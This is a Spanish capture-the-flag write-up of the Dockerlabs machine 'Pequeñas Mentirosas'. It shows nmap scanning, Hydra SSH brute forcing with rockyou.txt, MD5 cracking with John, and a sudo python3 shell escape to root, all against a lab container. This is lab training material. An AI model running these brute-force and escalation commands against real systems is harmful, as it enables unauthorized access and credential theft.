---
description: >-
  ✍️ Autor: beafn28🔍 Dificultad: Fácil  📅 Fecha de creación: 26/09/2024
  🐳Dockerlabs
---

# Pequeñas Mentirosas

### 🔍 RECONOCIMIENTO

En primer lugar, tras conectarnos a la máquina, utilizamos el comando:

```bash
ping -c 1 172.17.0.2
```

para verificar la conectividad de red.

<figure><img src="../.gitbook/assets/imagen (27).png" alt=""><figcaption></figcaption></figure>

A continuación, realizamos el comando:

```bash
nmap -sVC -p- -n --min-rate 5000 172.17.0.2
```

para realizar un escaneo de puertos y servicios detallado en la dirección IP.

<figure><img src="../.gitbook/assets/imagen (23).png" alt=""><figcaption></figcaption></figure>

Como podemos observar durante el escaneo que el **puerto 22** perteneciente al **servicio SSH** y el **puerto 80** perteneciente al **servicio HTTP** están abiertos por lo que a continuación se indagará más.

### 🔎 **EXPLORACIÓN**

Se utiliza el comando:

```bash
sudo nmap -sCV -p22,80 -v 172.17.0.2
```

para obtener más información sobre esos puertos específicamente.

<figure><img src="../.gitbook/assets/imagen (24).png" alt=""><figcaption></figcaption></figure>

Seguimos indagando más sobre los puertos y ahora indagamos sobre el **servicio HTTP**. Se ingresó la **dirección IP** en el navegador lo que llevó a que la página web nos mencione una pista y descubrimos que puede ser un usuario llamado **A** y tiene sentido ya que es un personaje de la serie de **Pequeñas Mentirosas**.&#x20;

<figure><img src="../.gitbook/assets/imagen (31).png" alt=""><figcaption></figcaption></figure>

### 🚀 **EXPLOTACIÓN**

Con la información obtenida anteriormente, realizamos el comando:

```bash
hydra -l a -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 5
```

que utiliza la herramienta **Hydra** para realizar un ataque de fuerza bruta contra el servicio **SSH** de una máquina con la IP **172.17.0.2**.

<figure><img src="../.gitbook/assets/imagen (32).png" alt=""><figcaption></figcaption></figure>

Al realizar el ataque de fuerza bruta, hemos descubierto la contraseña de **a**. Sabiendo esto, nos conectamos a través de **SSH** al usuario con el comando:

```bash
ssh a@172.17.0.2
```

<figure><img src="../.gitbook/assets/imagen (25).png" alt=""><figcaption></figcaption></figure>

Al listar el contenido del directorio, no encontramos ningún archivo. Es importante recordar que los archivos asociados con los servidores se almacenan en el directorio `/srv`.&#x20;

```bash
cd /srv/ftp
```

<figure><img src="../.gitbook/assets/imagen (26).png" alt=""><figcaption></figcaption></figure>

Nos descargamos a nuestro equipo esos archivos.&#x20;

```bash
scp a@172.17.0.2:/srv/ftp/* ~/Desktop/
```

<figure><img src="../.gitbook/assets/imagen (54).png" alt=""><figcaption></figcaption></figure>

Indagamos poco a poco nos llama la atención sobre los ficheros de texto denominados `retos`.

<figure><img src="../.gitbook/assets/imagen (35).png" alt=""><figcaption></figcaption></figure>

Sabiendo eso tenemos que desencriptar el archivo `cifrado_aes.enc` con la clave del archivo `clave_aes.txt` con el comando:

```bash
openssl enc -d -aes-128-cbc -in cifrado_aes.enc -out desencriptado_aes.txt -k thisisaverysecretkey!
```

El archivo resultante contiene:

<figure><img src="../.gitbook/assets/imagen (36).png" alt=""><figcaption></figcaption></figure>

No contiene nada relevante seguimos con el archivo `retos_asimetrico.txt` con el comando:

```bash
openssl pkeyutl -decrypt -in mensaje_rsa.enc -out desencriptado_rsa.txt -inkey clave_privada.pem
```

Pero nos vuelve a parecer el mismo resultado:

<figure><img src="../.gitbook/assets/imagen (37).png" alt=""><figcaption></figcaption></figure>

Vemos que hay un archivo `hash_spencer.txt` posiblemente **spencer** sea un usuario  por lo que a lo mejor ese **hash** es una contraseña. La podemos descifrar de dos maneras: la primera con **John** y la segunda con **Hydra** suponiendo que **spencer** es un usuario.

```bash
john --format=raw-md5 hash_spencer.txt
```

<figure><img src="../.gitbook/assets/imagen (38).png" alt=""><figcaption></figcaption></figure>

```bash
hydra -l spencer -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 5
```

<figure><img src="../.gitbook/assets/imagen (39).png" alt=""><figcaption></figcaption></figure>

```bash
ssh spencer@172.17.0.2
```

<figure><img src="../.gitbook/assets/imagen (40).png" alt=""><figcaption></figcaption></figure>

### 🔐 **PRIVILEGIOS**

Al estar dentro y ejecutar:

```bash
whoami
```

aún no somos **root**, por lo que hacemos:

```bash
sudo -l
```

para ver si hay algo para explotar.

<figure><img src="../.gitbook/assets/imagen (41).png" alt=""><figcaption></figcaption></figure>

Se ha identificado que podemos ejecutar `/usr/bin/python3` con permisos de `sudo`. Para escalar privilegios, utilizaremos [GTFObins](https://gtfobins.github.io/gtfobins/python/), que proporciona una lista de comandos que se pueden ejecutar utilizando Python.

Esto nos permitirá aprovechar el entorno de Python para ejecutar código que nos ayude a obtener acceso a niveles más altos de privilegio en el sistema.

```bash
sudo python3 -c 'import os; os.system("/bin/sh")'
```

<figure><img src="../.gitbook/assets/imagen (42).png" alt=""><figcaption></figcaption></figure>

Ya somos **root** por lo que hemos conseguido tener los máximos privilegios.&#x20;

> **Nota**: los demás archivos son para despistar.
